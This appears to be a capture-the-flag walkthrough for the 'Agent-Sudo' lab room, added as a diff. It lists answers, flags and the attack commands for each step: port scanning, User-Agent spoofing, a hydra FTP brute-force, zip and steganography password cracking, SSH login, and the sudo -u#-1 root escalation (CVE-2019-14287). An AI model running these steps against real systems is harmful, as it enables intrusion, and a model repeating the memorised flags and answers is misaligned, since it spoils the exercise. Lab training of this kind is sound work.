@@ -1,0 +1,83 @@
+		
+							      Agent-Sudo
+							     ============
+
+							      Questions
+							     ============
+
+						           TASK:1 Author note
+
+1. Deploy the machine
+ans: auto-complete
+
+							   TASK:2 Enumerate
+
+1. How many open ports?
+ans: 3
+command: nmap -v -A 10.10.195.123 > nmap.txt
+
+2. How you redirect yourself to a secret page?
+ans: user-agent
+
+3. What is the agent name?
+ans: chris
+command: curl "http://10.10.195.123" -H "User-Agent: C" -L
+
+						TASK:3 Hash cracking and brute-force
+
+1. FTP password
+ans: crystal
+command: hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.195.123
+
+2. Zip file password
+ans: alien
+command: ftp {ip}
+command: ls
+command: mget* (all download)
+command: binwalk -e cutie.png (extract files)
+command: zip2john 8702.zip > zipfile.txt
+command: john zipfile.txt
+
+3. steg password
+ans: Area51
+command: 7z e 8702.zip (zip password is alien)
+command: cat To_agentR.txt
+command: echo QXJlYTUx | base64 -d (QXJlYTUx is in the file)
+
+4. Who is the other agent (in full name)?
+ans: james
+command: steghide extract -sf cute-alien.jpg (password is Area51)
+command: cat message.txt (agent name is in the file)
+
+5. SSH password
+ans: hackerrules!
+command: cat message.txt (ssh password is in the file)
+
+							TASK:4 Capture the user flag 
+
+1. What is the user flag?
+ans: b03d975e8c92a7c04146cfa7a5a313c7 
+command: ssh james@{ip} (password = hackerrules!)
+command: cat user.txt
+
+2. What is the incident of the photo called?
+ans: roswell alien autospy
+command: scp james@10.10.163.134:/home/james/Alien_autospy.jpg .
+command: nautilus . (for google image search)
+
+							 TASK:5 Privilege escalation
+
+1. CVE number for the escalation
+ans: CVE-2019-14287  (google cve sudo) (sudo: ["ALL=(ALL) NOPASSWD:ALL"])
+
+2. What is the root flag?
+ans: b53a02f55b57d4439e3341834d70c062
+command: scp /root/Documents/leanpeas.sh james@10.10.163.134:/dev/shm
+command: chmod 777 leanpeas.sh
+command: ./leanpeas
+command: sudo -u#-1 /bin/bash (for root access) 
+command: cat /root/root.txt
+
+3. (Bonus) Who is Agent R?
+ans: DesKel (also in root.txt)
+
